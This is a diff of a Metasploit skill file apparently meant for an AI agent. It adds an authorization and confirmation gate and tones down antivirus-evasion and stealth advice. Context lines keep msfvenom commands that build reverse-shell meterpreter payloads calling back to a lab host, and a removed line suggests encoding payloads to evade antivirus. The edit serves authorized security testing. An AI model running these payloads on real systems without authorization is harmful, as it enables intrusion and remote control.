@@ -7,12 +7,21 @@ author: zebbern
 date_added: "2026-02-27"
 ---
 
-# Metasploit Framework
-
 > **⚠️ AUTHORIZED USE ONLY**
 > This skill is for educational purposes or authorized security assessments only.
 > You must have explicit, written permission from the system owner before using this tool.
 > Misuse of this tool is illegal and strictly prohibited.
+
+> **Mandatory confirmation gate**
+> Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
+> 1. Ask the user to state the exact target URL, IP, account, or resource.
+> 2. Ask the user to confirm written authorization and the permitted scope.
+> 3. Show the exact command(s) and explain their expected effect.
+> 4. Wait for explicit confirmation in the current conversation.
+>
+> Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.
+
+# Metasploit Framework
 
 ## Purpose
 
@@ -50,6 +59,8 @@ Before running exploit modules, ask the user to confirm the exact target host, s
 2. **Session Logs** - Command history and extracted data
 3. **Vulnerability Mapping** - Exploited vulnerabilities with CVE references
 4. **Post-Exploitation Artifacts** - Credentials, files, and system information
+
+All target IPs are illustrative lab addresses, not authorization. `check`, scanners, listeners and authentication attempts are active operations; inspect module info/options and risk before use. Credential collection, keylogging/screenshots, persistence, pivoting and destructive process operations require explicit scope beyond basic enumeration. Use synthetic lab accounts, minimize collected data, record artifacts/cleanup and verify restored state; do not indiscriminately extract credentials or persist access.
 
 ## Core Workflow
 
@@ -366,7 +377,7 @@ msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f war -o
 # Android APK
 msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o shell.apk
 
-# Encoded payload (evade AV)
+# Encoded payload format example; encoding does not guarantee AV/EDR evasion
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
 
 # List available formats
@@ -411,7 +422,7 @@ msf6 > sessions -i 1
 | `set [OPT] [val]` | Set option value |
 | `setg [OPT] [val]` | Set global option |
 | `run` / `exploit` | Execute module |
-| `check` | Verify target vulnerability |
+| `check` | Run a module-specific active check; may be intrusive and does not prove exploitation |
 | `back` | Deselect module |
 | `sessions -l` | List active sessions |
 | `sessions -i [N]` | Interact with session |
@@ -471,17 +482,17 @@ exploit/multi/http/jenkins_script_console
 ### Operational Security
 - Use encrypted channels (reverse_https) when possible
 - Clean up artifacts after testing
-- Avoid detection by monitoring systems
+- Coordinate monitoring with the authorized assessment team; stealth/evasion is not a default objective
 - Limit post-exploitation to agreed scope
 
 ## Troubleshooting
 
 | Issue | Solutions |
 |-------|-----------|
-| Database not connected | Run `sudo msfdb init`, start PostgreSQL, then `db_connect` |
+| Database not connected | Follow the local installation's reviewed database setup; do not assume privileged msfdb/system-service operations are required |
 | Exploit fails/no session | Run `check`; verify payload architecture; check firewall; try different payloads |
 | Session dies immediately | Migrate to stable process; use stageless payload; check AV; use AutoRunScript |
-| Payload detected by AV | Use encoding `-e x86/shikata_ga_nai -i 10`; use evasion modules; custom templates |
+| Payload detected by AV | Record the detection and validate the agreed test objective with defenders. Encoding is not a reliable AV/EDR bypass |
 
 ## When to Use
 This skill is applicable to execute the workflow or actions described in the overview.
